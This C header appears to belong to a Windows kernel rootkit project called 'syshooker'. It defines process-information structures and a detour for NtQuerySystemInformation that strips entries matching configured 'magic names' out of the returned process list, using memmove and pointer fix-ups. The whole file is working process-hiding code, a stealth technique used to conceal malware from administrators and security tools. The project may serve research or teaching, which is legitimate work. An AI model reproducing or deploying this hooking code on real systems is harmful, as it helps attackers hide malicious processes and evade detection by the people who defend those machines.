#pragma once
#include "Settings.h"

// macro source: https://stackoverflow.com/questions/3437404/min-and-max-in-c
#define MIN(a,b) (((a)<(b))?(a):(b))

// source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    CHAR Reserved1[48]; // was BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER Reserved1[3];
	ULONG Reserved2;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG Reserved3;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION;

typedef NTSTATUS(*NtQuerySystemInformation_t)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);

static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;

void PrintProcessStructInfo(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, ULONG BufferLeftOffset) {
	WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
	const wchar_t* RealProcessNameBufferAddr;

	if (ProcessInformationPtr->NextEntryOffset > 0) // shift if not last process
		RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - BufferLeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic
	else
		RealProcessNameBufferAddr = ProcessInformationPtr->ImageName.Buffer;

	wcsncpy(ProcessNameBuffer, RealProcessNameBufferAddr, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER - 1)); // -1 to ensure that the last char is \0
	kprintf("[+] syshooker: PrintProcessStructInfo (offset %d): Struct addr: %p, Process Name: %ws, Process Name buffer addr original: %p, shifted buffer: %p, NextEntryOffset: %d, threadcount: %d, thread struct size: %d\n", BufferLeftOffset, ProcessInformationPtr,  ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, RealProcessNameBufferAddr, ProcessInformationPtr->NextEntryOffset, ProcessInformationPtr->NumberOfThreads, sizeof(SYSTEM_THREAD_INFORMATION));
}

void PrintAllProcessEntries(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr) {
	kprintf("[+] syshooker: printing ALL entries\n");
	while (ProcessInformationPtr->NextEntryOffset != 0) {
		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
		PrintProcessStructInfo(ProcessInformationPtr, 0);
	}
	kprintf("[+] syshooker: done with printing ALL entries\n");
}

void FixNameBuffers(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, const ULONG LeftOffset) {
	// kprintf("[+] syshooker: FixNameBuffers start, offset: %d...\n", LeftOffset);
	while (ProcessInformationPtr->NextEntryOffset != 0) { // last one will be skipped
		wchar_t* RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - LeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic

		// rewrite the ImageName.Buffer address
		ProcessInformationPtr->ImageName.Buffer = RealProcessNameBufferAddr;

		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
	}
	// kprintf("[+] syshooker: FixNameBuffers done fixing addresses.\n");
}

NTSTATUS DetourNtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength)
{
	NTSTATUS OriginalStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {
		//kprintf("[+] syshooker: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);

        SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        if (ProcessInformationPtr) {
			//PrintAllProcessEntries(ProcessInformationPtr);

            while (1) {
				// create wchar_t buffer from ImageName (which is UNICODE_STRING)
                WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0

				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
					kprintf("[+] syshooker: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
					// Not the last process entry
					if (ProcessInformationPtr->NextEntryOffset > 0) {
						// we first calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						SYSTEM_PROCESS_INFORMATION* TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
						ULONG ProcessInformationBufferSizeToEnd = 0;
						while (TempProcessInformationPtr->NextEntryOffset != 0) {
							ProcessInformationBufferSizeToEnd += TempProcessInformationPtr->NextEntryOffset;
							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION); // don't forget last record size

						// get next structure address - we start copying from there
						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);

						// memmove memory and note that the buffer was 'shifted left' NextEntryOffset bytes (we need this to fix Name buffer addresses)
						ULONG RemovedStructSize = ProcessInformationPtr->NextEntryOffset;
						memmove(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);

						// fix addresses from the current entry to the end
						FixNameBuffers(ProcessInformationPtr, RemovedStructSize);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last entry in the linked list
					else {
						//kprintf("[+] syshooker: hiding the last process in the list...");
					
						// set previous NextEntryOffset to 0, to indicate that no additional entries follow
						PreviousProcessInformationPtr->NextEntryOffset = 0;

						// erease this process information structure
						memset(ProcessInformationPtr, 0, sizeof(SYSTEM_PROCESS_INFORMATION));
						break;
					}
				}

                if (ProcessInformationPtr->NextEntryOffset == 0) break;

				// move forward to the next entry
				PreviousProcessInformationPtr = ProcessInformationPtr;
                ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
            }
        }
	}
	
	return OriginalStatus;
}